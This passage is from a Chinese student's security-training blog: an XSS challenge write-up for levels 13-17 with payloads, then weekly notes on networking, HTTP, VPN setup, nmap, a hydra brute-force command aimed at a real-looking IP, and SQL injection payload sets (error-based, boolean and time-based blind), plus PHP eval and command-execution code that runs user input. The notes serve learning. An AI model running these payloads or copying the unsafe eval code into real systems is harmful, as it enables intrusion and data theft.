echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&apos;&lt;center&gt;
&lt;form id=search&gt;
&lt;input name=&quot;t_link&quot;  value=&quot;&apos;.&apos;&quot; type=&quot;hidden&quot;&gt;
&lt;input name=&quot;t_history&quot;  value=&quot;&apos;.&apos;&quot; type=&quot;hidden&quot;&gt;
&lt;input name=&quot;t_sort&quot;  value=&quot;&apos;.htmlspecialchars($str00).&apos;&quot; type=&quot;hidden&quot;&gt;
&lt;input name=&quot;t_cook&quot;  value=&quot;&apos;.$str33.&apos;&quot; type=&quot;hidden&quot;&gt;
&lt;/form&gt;
&lt;/center&gt;&apos;;
?&gt;
&lt;center&gt;&lt;img src=level13.png&gt;&lt;/center&gt;
&lt;?php 
echo &quot;&lt;h3 align=center&gt;payload的长度:&quot;.strlen($str).&quot;&lt;/h3&gt;&quot;;
?&gt;
&lt;/body&gt;
&lt;/html&gt;

抓包修改cookie
//payload：&quot;onclick=window.alert(1) type=&quot;text&quot;//
</code></pre><h2 id="less-14——————————"><a href="#less-14——————————" class="headerlink" title="less-14——————————"></a>less-14——————————</h2><pre><code>&lt;html&gt;
&lt;head&gt;
&lt;meta http-equiv=&quot;content-type&quot; content=&quot;text/html;charset=utf-8&quot;&gt;
&lt;title&gt;欢迎来到level14&lt;/title&gt;
&lt;/head&gt;
&lt;body&gt;
&lt;h1 align=center&gt;欢迎来到level14&lt;/h1&gt;
&lt;center&gt;&lt;iframe name=&quot;leftframe&quot; marginwidth=10 marginheight=10 src=&quot;http://www.exifviewer.org/&quot; frameborder=no width=&quot;80%&quot; scrolling=&quot;no&quot; height=80%&gt;&lt;/iframe&gt;&lt;/center&gt;&lt;center&gt;这关成功后不会自动跳转。成功者&lt;a href=/xsschallenge/level15.php?src=1.gif&gt;点我进level15&lt;/a&gt;&lt;/center&gt;
&lt;/body&gt;
&lt;/html&gt;
</code></pre><p>第14关不会了，也没有头绪，通过查找发现了一位大佬的blog有写</p>
<p><a href="https://xz.aliyun.com/t/1206" target="_blank" rel="noopener">https://xz.aliyun.com/t/1206</a></p>
<h2 id="less-15—————————————"><a href="#less-15—————————————" class="headerlink" title="less-15—————————————"></a>less-15—————————————</h2><pre><code>&lt;html ng-app&gt;
&lt;head&gt;
        &lt;meta charset=&quot;utf-8&quot;&gt;
        &lt;script src=&quot;https://ajax.googleapis.com/ajax/libs/angularjs/1.2.0/angular.min.js&quot;&gt;&lt;/script&gt;
&lt;script&gt;
window.alert = function()  
{     
confirm(&quot;完成的不错！&quot;);
 window.location.href=&quot;level16.php?keyword=test&quot;; 
}
&lt;/script&gt;
&lt;title&gt;欢迎来到level15&lt;/title&gt;
&lt;/head&gt;
&lt;h1 align=center&gt;欢迎来到第15关，自己想个办法走出去吧！&lt;/h1&gt;
&lt;p align=center&gt;&lt;img src=level15.png&gt;&lt;/p&gt;
&lt;?php 
ini_set(&quot;display_errors&quot;, 0);
$str = $_GET[&quot;src&quot;];
echo &apos;&lt;body&gt;&lt;span class=&quot;ng-include:&apos;.htmlspecialchars($str).&apos;&quot;&gt;&lt;/span&gt;&lt;/body&gt;&apos;;
?&gt;
</code></pre><p><strong>注：</strong></p>
<pre><code>ng-include 指令用于包含外部的 HTML 文件。
ng-include 可以作为一个属性，或者一个元素使用
ng-include 里面引用其他页面还要再加单引号，即双引号里面再加单引号
默认情况下，包含的内容还需要在同一域名下

payload：&apos;level1.php?name=test&lt;img src=1 onerror=alert(1)&gt;&apos;
</code></pre><h2 id="less-16————————————"><a href="#less-16————————————" class="headerlink" title="less-16————————————-"></a>less-16————————————-</h2><pre><code>&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;
&lt;head&gt;
&lt;meta http-equiv=&quot;content-type&quot; content=&quot;text/html;charset=utf-8&quot;&gt;
&lt;script&gt;
window.alert = function()  
{     
confirm(&quot;完成的不错！&quot;);
 window.location.href=&quot;level17.php?arg01=a&amp;arg02=b&quot;; 
}
&lt;/script&gt;
&lt;title&gt;欢迎来到level16&lt;/title&gt;
&lt;/head&gt;
&lt;body&gt;
&lt;h1 align=center&gt;欢迎来到level16&lt;/h1&gt;
&lt;?php 
ini_set(&quot;display_errors&quot;, 0);
$str = strtolower($_GET[&quot;keyword&quot;]);
$str2=str_replace(&quot;script&quot;,&quot;&amp;nbsp;&quot;,$str);
$str3=str_replace(&quot; &quot;,&quot;&amp;nbsp;&quot;,$str2);
$str4=str_replace(&quot;/&quot;,&quot;&amp;nbsp;&quot;,$str3);
$str5=str_replace(&quot;    &quot;,&quot;&amp;nbsp;&quot;,$str4);
echo &quot;&lt;center&gt;&quot;.$str5.&quot;&lt;/center&gt;&quot;;
?&gt;
&lt;center&gt;&lt;img src=level16.png&gt;&lt;/center&gt;
&lt;?php 
echo &quot;&lt;h3 align=center&gt;payload的长度:&quot;.strlen($str5).&quot;&lt;/h3&gt;&quot;;
?&gt;
&lt;/body&gt;
&lt;/html&gt;

使用%0d或%0a绕过         %0a-------&quot;/n&quot; 换行符       %0d--------&quot;/r&quot;回车符
payload：&lt;input%0Donclick=window.alert(1)&gt;
</code></pre><h2 id="less-17——————————"><a href="#less-17——————————" class="headerlink" title="less-17——————————-"></a>less-17——————————-</h2><pre><code>&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;
&lt;head&gt;
&lt;meta http-equiv=&quot;content-type&quot; content=&quot;text/html;charset=utf-8&quot;&gt;
&lt;script&gt;
window.alert = function()  
{     
confirm(&quot;完成的不错！&quot;); 
}
&lt;/script&gt;
&lt;title&gt;欢迎来到level17&lt;/title&gt;
&lt;/head&gt;
&lt;body&gt;
&lt;h1 align=center&gt;欢迎来到level17&lt;/h1&gt;
&lt;?php
ini_set(&quot;display_errors&quot;, 0);
echo &quot;&lt;embed src=xsf01.swf?&quot;.htmlspecialchars($_GET[&quot;arg01&quot;]).&quot;=&quot;.htmlspecialchars($_GET[&quot;arg02&quot;]).&quot; width=100% heigth=100%&gt;&quot;;
?&gt;
&lt;h2 align=center&gt;成功后，&lt;a href=level18.php?arg01=a&amp;arg02=b&gt;点我进入下一关&lt;/a&gt;&lt;/h2&gt;
&lt;/body&gt;
&lt;/html&gt;

这一题。。我的浏览器版本都不支持flash，chrome支持但是过滤了弹窗。。so，只将payload写下来
payload：arg01=a&amp;arg02= onmouseover=alert(1)
</code></pre><p>第18，19是flash xss，还没研究过，等无聊的时候再看看，可以参考以下链接：<br><a href="https://www.secpulse.com/archives/44299.html" target="_blank" rel="noopener">https://www.secpulse.com/archives/44299.html</a></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://jaychouzzk.github.io/2018/12/30/第五周笔记/">

    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Jaychouzzk">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Jaychouzzk's blogs">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2018/12/30/第五周笔记/" itemprop="url">第五周笔记</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">發表於</span>
              
              <time title="創建於" itemprop="dateCreated datePublished" datetime="2018-12-30T16:27:02+08:00">
                2018-12-30
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>第五周第一天</p>
<p>OSI七层模型</p>
<pre><code>ip    tcp包头    数据

网络层ip

传输层   tcp udp

tcp可靠、面向连接    udp：不可靠、面向无连接

应用层：指定数据的格式

练习：用nc软件查看数据包
</code></pre><p>端口   0~65535    源端口和目的端口各16位</p>
<pre><code>    周知端口0~1023
    软件预留端口1024~49151
    预留动态端口49152~65535
****常用：53（dns）    21：FTP认证    20：实际传输    23：telnet        25：STMP简单邮件传送    110：POP3接收邮件    80：HTTP    135：smb文件共享    443：https    445：共享服务    1433：sql server        3306：mysql    3389：rdp远程桌面    5432:postgresql        6379:redis        8080:tomcat        10051:zabbix    27017:mongodb
</code></pre><p>TCP协议：</p>
<pre><code>三次握手 seq标记    ack=seq标识位置+1        SYN    
四次挥手                                FIN    
</code></pre><p>UDP协议：</p>
<pre><code>IP包头（20字节）+UDP报文头+UDP数据
特点：更精简，占用资源少

使用wireshark抓包工具抓包
</code></pre><p><strong><strong>HTTP协议</strong></strong></p>
<pre><code>特点：
*简单快速只传送请求方法和路径：GET\POST\HEAD\

*灵活

*无连接：每次连接只处理一个请求即断开

*无状态协议：处理事务没有记忆能力

*支持BS和CS架构

URL：

*http://admin:123@www.baidu.com：80/new/index.php？id=1#
*协议  + http基础认证  +域名     +端口  +路径  +文件名  +参数  +锚部分

URL编码****
‘’    --%27
“”    --%22
#    --%23
空格    --%20
%    --%25

request请求
1--请求行                
（2-空白行之前）--请求头    

空白行                
请求数据

GET请求
GET  /HTTP基础/123.txt   /HTTP/1.1
hOST:192.168.11.111:8000
Accept：*/*
换行


POST请求
POST /HTTP基础/123.txt   /HTTP/1.1
hOST:192.168.11.111:8000
Accept：*/*
换行
id=123&amp;password=123

请求方法：

GET
HEAD  用于捕获报头
PUT        iis put方法漏洞（自己研究）
DELETE    请求删除
CONNECT
OPTIONS    允许客户端查看服务器支持的方法
</code></pre><p>练习：用wireshark抓http数据包</p>
<pre><code>响应    Response

状态行    http/1.1 405 not allowed（状态码）
响应头
空行
相应内容

*状态码   302临时重定向（location）
        301永久跳转        百度看一下区别

        400
        403 禁止访问
        404    Not Found
        405  不允许

        5xx  服务器问题（代码）
</code></pre><p><strong>*</strong>重点：  五层模型、tcp三次握手 、 四次挥手 、wireshark、http请求\响应的行、头、空行、内容 、burpSuite代理，看数据包    </p>
<pre><code>*****晚上总结请求头的含义*****


请求头:
User-Agent             浏览器的标识信息
Accept-Language     浏览器使用的语言
Accept                 是指发送的数据类型
Accept-Encoding     浏览器向中间件发送数据时使用的压缩方式

Host                 访问的网站域名+端口
Cookie                 网站认证信息
Referer             上一个打开的网站
X-Forwarded-For        客户端代理的IP
</code></pre><p>电脑     192.168.11.111     120.244.111.247</p>
<p>代理服务器    114.155.123.124     X-Forwarded-For：120.244.111.247</p>
<p>代理服务器    103.343.32.12    X-Forwarded-For：120.244.111.247,114.155.123.124</p>
<p>访问     <a href="http://www.baidu.com" target="_blank" rel="noopener">www.baidu.com</a>        真实IP 120.244.111.247</p>
<p>响应头</p>
<pre><code>Date             日期        GTM时间  和我们UTC时间差8个小时
Set-Cookie        cookie的来源（给网站设置cookie）
Content-Type    告诉浏览器返回的内容格式
Server            显示中间件的版本信息
X-Powered-By    使用的脚本语言
</code></pre><p>第五周第三天</p>
<p>一.安装浏览器插件</p>
<pre><code>hackbar、Header Edit、wappalzer、 proxy、server ip
</code></pre><p>二.在windows 2008上搭建vpn</p>
<pre><code>搭建PPTP连接

1.打开服务管理器---&gt;添加角色----&gt;勾选“网络策略和访问服务 ”------&gt;下一步-----&gt;勾选&quot;路由和远程访问服务&quot;---&gt;开始安装

2.角色中出现了“路由和远程访问”，现在是红色的，右键选择配置它，打开向导---&gt;选择自定义配置--&gt;服务里全选--&gt;完成--&gt;变成绿色

3.新增一个接口：ipv4--&gt;NAT---&gt;新建一个接口--&gt;选择要使用的网卡---&gt;接口类型选择“公用接口连接到Internet”,勾选“在此接口上启用NAT”

4.开始菜单--&gt;管理工具--&gt;网络策略服务器--&gt;策略--&gt;网络策略--&gt;把里面的两项被组织的属性改成“授予访问权限”

5.服务器管理器--&gt;配置--&gt;本地用户和组--&gt;添加一个用户--&gt;填写用户名、密码、勾选“用户不能更改密码”和“密码永不过期”，去掉“下次登陆须更改密码”的勾，点创建。

6.开始菜单--&gt;管理工具--&gt;本地安全策略--&gt;本地策略--&gt;用户权限分配--&gt;拒绝本地登陆，添加vpn用户---&gt;拒绝通过远程桌面登陆,添加vpn用户。

7.连接VPN：在客户机创建一个新连接--&gt;选择连接到工作区---&gt;使用我的internet连接--&gt;填写ip地址--&gt;填写之前创建的VPN用户名和密码--&gt;连接即可
</code></pre><p>三.docker：<br>        sudo apt-get install docker.io</p>
<pre><code>安装加速器https://yeasy.gitbooks.io/docker_practice/install/mirror.html
或者在 /etc/docker/daemon.json 中写入
{
  &quot;registry-mirrors&quot;: [&quot;https://registry.docker-cn.com&quot;]
}


sudo docker run --rm -it alpine /bin/sh



在docker中启动ubuntu：sudo docker run --rm -it ubuntu /bin/sh

在docker中启动centOS：sudo docker run --rm -it centos /bin/sh
</code></pre><p>四.VPN :PPTP   L2TP </p>
<pre><code>第一种连接方法：
1.把镜像拉入虚拟机：

2.docker pull mobtitude/vpn-pptp
然后创建一个文件chap-secrets，打开写入   name *  password * 并记住路径/vpn-k

3.docker run -d --privileged --net host -v /root/chap-secrets:/ppp/chap-secrets mobtitude/vpn-pptp


第二种连接方法：
1.docker pull hwdsl2/ipsec-vpn-server

2.modprobe af_key

3.VPN_IPSEC_PSK=ipsec-keydoc
VPN_USER=uname
VPN_PASSWORD=upass

4.docker run --name vpn-docker --privileged --env-file /root/vpn.env -p 500:500/udp -p 4500:4500/udp -v /lib/modules:/lib/modules:ro  -d --privileged hwdsl2/ipsec-vpn-server


第三种方法：
使用shadowsocks工具代理连接VPN

1.apt install shadowsocks先安装

2.修改配置文件  vi /etc/shadowsocks/config.json

   &quot;server&quot;:&quot;0.0.0.0&quot;,
    &quot;server_port&quot;:8888,
    &quot;local_address&quot;: &quot;127.0.0.1&quot;,
    &quot;local_port&quot;:1080,
    &quot;password&quot;:&quot;123456&quot;,
    &quot;timeout&quot;:300,
    &quot;method&quot;:&quot;aes-256-cfb&quot;,
    &quot;fast_open&quot;: false,
    &quot;workers&quot;: 1,
    &quot;prefer_ipv6&quot;: false

3.（可选）开启BBR加速支持echo &quot;net.core.default_qdisc=fq&quot; &gt;&gt; /etc/sysctl.conf
echo &quot;net.ipv4.tcp_congestion_control=bbr&quot; &gt;&gt; /etc/sysctl.conf
sysctl -p
lsmod | grep bbr
</code></pre><p>第五周第四天</p>
<p>渗透测试：白盒黑盒</p>
<p>流程：</p>
<pre><code>1.前期沟通
2.信息搜集（四五天）
3，威胁建模：根据信息进行分析攻击点（一天）
4.渗透测试：根据分析进行攻击
5.后渗透测试：根据测试结果进行更多尝试
6.写报告

www.exploit-db.com
https://www.somd5.com/
https://blog.csdn.net/u012278016/article/details/81772566
</code></pre><p>扫描工具：</p>
<pre><code>测网站漏洞工具：

    AWVS（通过爬虫进行网站漏洞测试）的安装

    网站漏洞扫描https://butian.360.cn/Register/补天公益

    啊d--&gt;ASP网站

sql注入工具
    sqlmap

综合平台类：
    BurpSuite、Metasploit

搜集域名信息
    //子域名：news.baidu.com这种
    子域名挖掘：subDomainsBrute、子域名挖掘机

端口扫描：NMAP---功能强大，隐蔽
    安装vc扩展、npcap组件，增加环境变量
    扫描指定ip：    nmap ip
    原理：只发送SYN，不建立连接
    nmap -Pn  强制为激活的主机，进行强制扫描
    nmap -sn  主机发现
    nmap    -sn -oX     Desktop/report.mxl报告输出到文件
    nmap -sS    半开放扫描（默认方式）
    nmap -p 80    指定扫描端口
    nmap -O    ip    探测操作系统版本
    nmap -A        详细信息
    nmap -iL 目录 根据ip列表进行扫描
    nmap -iL 目录 --webxml 文件名    把结果以xml形式输出到文件

python环境安装
    1.安装python2.7
    2.在家目录下创建.pip文件夹，把源文件移动进去
    3.执行pip install requests

字典生成工具
pentest.db工具
    解压，在目录中用cmd执行pip install lxml
    使用 python pen.py
    帮助    python pen.py --help

爆破工具
    *BurpSuite
    *hydra***   hydra -l用户名 -p密码字典 
                    -s指定非默认端口
                    -e ns空密码试探
                    -f成功后立刻停止
    例子：hydra -l root -P 目录 -s 3308  -e ns -t 5 114.115.175.102 mysql
</code></pre><hr>
<p>报错注入–长度受限制，30个字符</p>
<pre><code>floor()
---
select * from stu where id=1 and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a);

ERROR 1062 (23000): Duplicate entry &apos;root@localhost1&apos; for key &apos;group_key&apos;
---
select * from stu where id=2 and (select 1 from (select count(*),concat((select mid(group_concat(schema_name),1,153)from information_schema.schemata),floor(rand(0)*2))x from information_schema.tables group by x)a);

ERROR 1062 (23000): Duplicate entry &apos;information_schema,challenges,dvwa,mysql,pentest,performance_sch&apos; for key &apos;group_key&apos;
---

mid(&apos;hello&apos;,1,1)=&gt;支持老版本
substr(&apos;hello&apos;,1,1)=&gt;不支持老版本



extractvalue():
---
select * from stu where id=1 and (extractvalue(1,concat(0x7e,(select user()),0x7e)));
ERROR 1105 (HY000): XPATH syntax error: &apos;~root@localhost~&apos;
---
select * from stu where id=1 and (extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables),0x7e)));
ERROR 1105 (HY000): XPATH syntax error: &apos;~CHARACTER_SETS,COLLATIONS,COLLA&apos;
---



updatexml():
---
select * from stu where id=1 and (updatexml(1,concat(0x7e,(select user()),0x7e),1));
ERROR 1105 (HY000): XPATH syntax error: &apos;~root@localhost~&apos;
---
select * from stu where id=1 and (updatexml(1,concat(0x7e,(select mid(group_concat(schema_name),1,25)from information_schema.schemata),0x7e),1));
ERROR 1105 (HY000): XPATH syntax error: &apos;~information_schema,challe~&apos;
---




insert:

insert into user(1,2,3) value(&apos;1&apos;,&apos;2&apos;,&apos;3&apos;);

123&apos;,1,2)#
</code></pre><hr>
<pre><code>ascii()将字符转为十进制    
</code></pre><hr>
<pre><code>Boolean类型盲注：


?id=1%27%20%20and mid(user(),1,100)=&apos;root@localhost&apos; #
---

?id=1%27%20%20and ascii(mid(user(),1,1))&gt;100 #
---
(select length(group_concat)from information_schema.schemata)&gt;100
---
</code></pre><hr>
<pre><code>延时盲注：

    1 and sleep(5) %23
    1) and sleep(5) %23
    1)) and sleep(5) %23
    1&apos; and sleep(5) %23
    1&apos;)
    1&apos;)) and sleep(5) %23 
    1&quot; and sleep(5) %23
    1&quot;) and sleep(5) %23
    1&quot;)) and sleep(5) %23
</code></pre>
          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://jaychouzzk.github.io/2018/12/23/第四周笔记/">

    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Jaychouzzk">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Jaychouzzk's blogs">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2018/12/23/第四周笔记/" itemprop="url">第四周笔记</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">發表於</span>
              
              <time title="創建於" itemprop="dateCreated datePublished" datetime="2018-12-23T14:58:31+08:00">
                2018-12-23
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h2 id="第四周"><a href="#第四周" class="headerlink" title="第四周"></a>第四周</h2><h2 id="周一"><a href="#周一" class="headerlink" title="周一"></a>周一</h2><p>PHP表单处理：<br>    超全局变量$_POST   $_GET  $_REQUEST  他们都是数组</p>
<p>$_POST<br>    提交表单  提交方式method=”POST”   提交name=”username” value=”1”<br>    &lt;input type=”submit” name=”submit”&gt;</p>
<pre><code>接收：
$user=$_POST[&quot;username&quot;]
$submit=$_POST[&quot;submit&quot;]


跳转：
PHP跳转    header(&quot;Location: login.php&quot;);
JS跳转 echo &apos;&amp;lt;script&amp;gt;location.href=&quot;install.php&quot;;&amp;lt;/script&amp;gt;&apos;
</code></pre><p>$_GET:<br>    发送<br>    &lt;a href=””&gt;登录&lt;/a&gt;</p>
<pre><code>接收  :
$id=$_GET[&apos;name&apos;]
echo $id;
</code></pre><p>$_REQUEST:  能接收POST和GET两种数据</p>
<p>PHP文件操作（filesystem函数）：</p>
<pre><code>fread()函数读取打开的文件
fwrite（）函数写入一个打开的文件
unlink（）函数删除文件
is_dir检查文件是否是目录
is_file()检查是否常规文件
file_exists（）检查文件是否存在
copy（）复制文件
rename（）重命名文件或目录
file_get_contents(文件名)  读取整个文件内容，***打开远程文件***

php://filter file_get_contents()

echo file_get_contents(&quot;http://www.baidu.com&quot;)
file_put_contents(文件名)   覆盖写入文件

$f=fopen(&apos;login.php&apos;,&apos;r&apos;);//打开一个文件   指向开头
echo fgets($f);                                   //读一行
feof($f)             ;                                 //检测是否到文件末尾

while (!feof($f)){                                  //用while循环输出文件内容  直到文件末尾
    echo fgets($f);                                 //输出每行的内容
}
fclose($f);
</code></pre><p>PHP文件打开方式<br>    r    只读，在开头开始<br>    r+    读写，在开头开始<br>    w    只写，清空内容，如果不存在创建新文件<br>    w+    读写，清空文件，不存在则创建新文件<br>    a    追加    在末尾进行写操作，可以创建新文件<br>    a+    读或追加    末尾写内容<br>    x    只写（新建）<br>    x+    读写（新建）</p>
<pre><code>//X-Forwarded-For火狐的header插件（记录网站IP）
//display_error关闭网站就不会报错
</code></pre><p>PHP中的代码执行：</p>
<pre><code>eval(&quot;&quot;)
例子：eval(&quot;echo 123;\$a=&apos;aaa&apos;;&quot;);
</code></pre><p>echo $a;<br>    //结果123aaa</p>
<pre><code>eval(&quot;\$a=Array();&quot;);    //字符串转换成代码执行
print_r($a);

preg_replace(&quot;a/123/e&quot;,&apos;$c=123&apos;,&quot;abab&quot;);
//第一个路径后有e  则第二个代码能被执行

$func = create_function(&apos;&apos;,&apos;代码&apos;)


$_GET[&apos;a&apos;]($_GET[&apos;b&apos;]);
</code></pre><p>课堂实验：制作一个eval计算器</p>
<pre><code>&amp;lt;form action=&quot;&quot; method=&quot;post&quot;&amp;gt;
请输入要计算的内容：
&amp;lt;input type=&quot;text&quot; name=&quot;eval&quot; value=&quot;Rg:1+2-3&quot;&amp;gt;
&amp;lt;input type=&quot;submit&quot;&amp;gt;
&amp;lt;/form&amp;gt;

&amp;lt;?php
@$eval=($_POST[&apos;eval&apos;]);
if ($eval){
    @eval(&quot;\$res=$eval;&quot;);
    echo &quot;结果是：$res&quot;;
}
?&amp;gt;
</code></pre><p>PHP命令执行：<br>    exec(“dir-l ~/“,$output);    //output用来反馈结果<br>    print_r（$output）;</p>
<pre><code>system(&quot;命令&quot;)        //不需要接收

@output=shell_exec(&quot;whoami&quot;,$output);
print_r($output);

popen()    打开一个进程
</code></pre><p>$_GET<a href="$_GET[&#39;b&#39;]">‘a’</a></p>
<p>5.6以下     a = assert&amp;b = phpinfo()</p>
<p>7    a = assert&amp;b = phpinfo()   会报assert参数错误，不能为动态变量</p>
<p>file操作</p>
<p>fopen          打开方式： r   w   a   x  </p>
<p>fclose         关闭文件</p>
<p>fgets         获取一行的数据</p>
<p>feof        判断是否到文件结尾</p>
<p>结合while读取内容</p>
<p>while(!feof($f)){ echo $fgets($f);}</p>
<p>fread         读取文件内容，需要指定$f的长度</p>
<p>fwrite         写内容，需要指定$f和写入字符串</p>
<p>is_file     is_dir     file_exists</p>
<p>unlink         copy     remname</p>
<p>file_get_contents (‘./data/123.txt’);<br>file_get_contents (‘./data/123.txt’,’abcdef’);</p>
<p>eval </p>
<p>eval(‘echo 123;’)     eval(“$a = 123;”)   eval(“\$arr = [‘name’=&gt;zs]”)</p>
<p>计算器：<br>        eval(“\$res = $_POST[‘str’];”)    echo $res;</p>
<p>执行系统命令的函数：<br>exec<br>exec(‘dir’,$output);<br>print_r($output);</p>
<p>system<br>system(‘whoami’);         </p>
<p>shell_exec<br>$outpu = shell_exec(‘ipconfig’);<br>print_r($outpu);    </p>
<p>popen(有小问题)<br>$f = popen(“dir”,”r”);<br>echo fread($f , 1000);<br>pclose($f);</p>
<hr>
<h2 id="周二"><a href="#周二" class="headerlink" title="周二"></a>周二</h2><p>文件包含：</p>
<p>include ‘show.php’;//只会警告，脚本继续<br>require ‘show.php’;//会产生致命错误，停止脚本</p>
<p>include_once<br>require_once</p>
<p>include  在php文件开始运行的时候就包含，复制的位置还是关键字的地方<br>require  在执行到require关键字的时候才包含</p>
<p>一般用于包含导航栏，包含配置文件</p>
<p>Cookie：</p>
<p>setcookie(name,value,expire:time()+过期时间);</p>
<p>防止伪造cookie</p>
<h2 id="生成cookie"><a href="#生成cookie" class="headerlink" title="生成cookie"></a>生成cookie</h2><p>$tmp = rand(1,1000);</p>
<p>$tmp = $uname . $tmp . time();</p>
<p>$tmp = md5($tmp);</p>
<p>$f = fopen($tmp, ‘a’);</p>
<p>fwrite($f,$uname);</p>
<p>fclose($f);</p>
<h2 id="setcookie-‘id’-tmp-time-50"><a href="#setcookie-‘id’-tmp-time-50" class="headerlink" title="setcookie(‘id’, $tmp, time()+50);"></a>setcookie(‘id’, $tmp, time()+50);</h2><h2 id="校验cookie"><a href="#校验cookie" class="headerlink" title="校验cookie"></a>校验cookie</h2><p>@$id = $_COOKIE[‘id’]</p>
<p>if(file_exists(‘./data/session_’ . $id)){</p>
<pre><code>$f = fopen(&apos;./data/session_&apos; . $id , &apos;r&apos;);

$uname = fgets($f);

fclose($f);
</code></pre><p>}</p>
<hr>
<p>Session     $_SESSION（超全局变量，信息存储于服务器硬盘当中）：</p>
<hr>
<p>session_start()            //启用session</p>
<p>$_SESSION[‘name’] = ‘zs’        //存入用户名</p>
<p>if(isset($_SESSION[‘name’])){<br>    //判断是否存在<br>}</p>
<p>session_destroy()    //清空session缓存</p>
<p>跳转：<br>header(“Location: show.php”);</p>
<p>&lt;script&gt;location.href=’show.php’&lt;/script&gt;</p>
<p>&lt;script&gt;location.navigate=’show.php’&lt;/script&gt;//待测</p>
<p>&lt;script&gt;top.location=’show.php’&lt;/script&gt;</p>
<p>&lt;script&gt;self.location=’show.php’&lt;/script&gt;</p>
<p>&lt;script&gt;location.replace=’show.php’&lt;/script&gt;</p>
<h2 id="lt-meta-http-equiv-refresh-content-0-URL-’show-php’-gt"><a href="#lt-meta-http-equiv-refresh-content-0-URL-’show-php’-gt" class="headerlink" title="&lt;meta http-equiv=refresh content=0;URL=’show.php’&gt;"></a>&lt;meta http-equiv=refresh content=0;URL=’show.php’&gt;</h2><h2 id="上传文件："><a href="#上传文件：" class="headerlink" title="上传文件："></a>上传文件：</h2><p>&lt;form enctype=”multipart/form-data” method=”post”&gt;<br>    &lt;input type=”file” name=””&gt;<br>    &lt;input type=”submit”&gt;</p>
<h2 id="lt-form-gt"><a href="#lt-form-gt" class="headerlink" title="&lt;/form&gt;"></a>&lt;/form&gt;</h2><p>if (isset($_FILES[‘filename’])){<br>    if($_FILES[‘filename’][‘error’] == 0){<br>        echo ‘文件的名字是：’ . $_FILES[‘filename’][‘name’] . “&lt;br&gt;”;<br>        echo ‘类型是：’ . $_FILES[‘filename’][‘type’] . “&lt;br&gt;”;<br>        echo ‘大小是：’ . $_FILES[‘filename’][‘size’] . “&lt;br&gt;”;<br>        echo ‘临时目录是：’ . $_FILES[‘filename’][‘tmp_name’] . “&lt;br&gt;”;</p>
<p>读写    //$data = file_get_contents($_FILES[‘filename’][‘tmp_name’]);<br>        //file_put_contents(‘./data/‘ . $_FILES[‘filename’][‘name’],$data);</p>
<p>拷贝        //copy($_FILES[‘filename’][‘tmp_name’],’./data/‘ . $_FILES[‘filename’][‘name’]);</p>
<p>一般是用剪切，而不用copy和读写<br>剪切     $ok = move_uploaded_file($_FILES[‘filename’][‘tmp_name’],’./data/‘ . $_FILES[‘filename’][‘name’]);</p>
<pre><code>    if ($ok){
        echo &apos;上传的路径为：./data/&apos; . $_FILES[&apos;filename&apos;][&apos;name&apos;];
    }else{
        echo &apos;上传失败&apos;;
    }

}else{
    echo &apos;上传失败&apos;;
    die();
}
</code></pre><p>}</p>
<hr>
<hr>
<p>数据库:一个用来存放数据的服务，或者平台。要么以结构化（数据库、表、数据）的形式存在，要么以非结构化（key =&gt; value）的形式存放。</p>
<p>结构化：<br>学生库（stu_db）–&gt;学生表（stu_table）–&gt;id、  name、  number、  class<br>                                        1      hu     21100       95<br>                                        2      xi     21351    96</p>
<p>非结构化：<br>students_1.txt<br>id = 1<br>name = hu<br>number = 21100<br>class = 95</p>
<p>mysql(轻量级开源数据库，适用于中小型企业，性能较好)<br>sql server(微软开发的，适用于大中型企业，需要微软的系统作为支撑，不支持跨平台)<br>oracle(收费，适用于大型企业，可跨平台，需要硬件配置高)</p>
<p>数据库模型：<br>    关系型数据库（结构化）：mysql/mssql    oracle    DB2<br>    非关系型数据库（非结构化）：redis    mongodb    hbase neo4j nosql</p>
<p>PHPstudy(WAMP)  mysql  配置环境变量</p>
<p>dos窗口登陆mysql  -&gt;  mysql -h -uroot -proot</p>
<p>mysql交互窗口<br>mysql-front    开源的数据库管理器<br>phpmyadmin    基于网页的数据库管理器</p>
